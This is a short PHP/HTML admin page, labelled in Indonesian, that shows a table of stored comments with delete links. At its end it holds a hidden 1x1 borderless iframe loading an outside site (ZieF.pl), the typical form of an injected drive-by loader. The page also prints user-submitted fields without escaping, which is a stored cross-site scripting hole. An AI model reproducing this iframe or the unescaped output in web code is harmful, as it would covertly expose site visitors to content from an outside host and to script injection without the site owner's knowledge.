<!DOCTYPE HTML>
<html>
<head>
	<title>a</title>
	<link rel="stylesheet" type="text/css" href="./css/bootstrap.min.css">
</head>
<body>		<center><h1><font face="Modern">Data Komentar</font></h1></center>
		
	<table class="table table-stripped table-bordered">
	<thead>
	<tr>
	<td>id</td>
	<td>nama</td>
	<td>email</td>
	<td>isi</td>
	<td>action</td>
	</tr>
	</thead>
	<tbody>
	<?php include './koneksi.php';
	$data=mysqli_query($koneksi,"select * from data");
	while($d=mysqli_fetch_array($data)){
	?>
	<tr>
	<td><?php echo $d['id'];?></td>
	<td><?php echo $d['name'];?></td>
	<td><?php echo $d['email'];?></td>
	<td><?php echo $d['isi'];?></td>
	<td>	<a href="hapus.php?id=<?php echo $d['id'];?>">||-HAPUS-||</a>	<?php }?>
	</td>
	</tr>
	</tbody>
	</table>
	<a href="login.html" class="glyphicon glyphicon-trash">LOGOUT</a>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>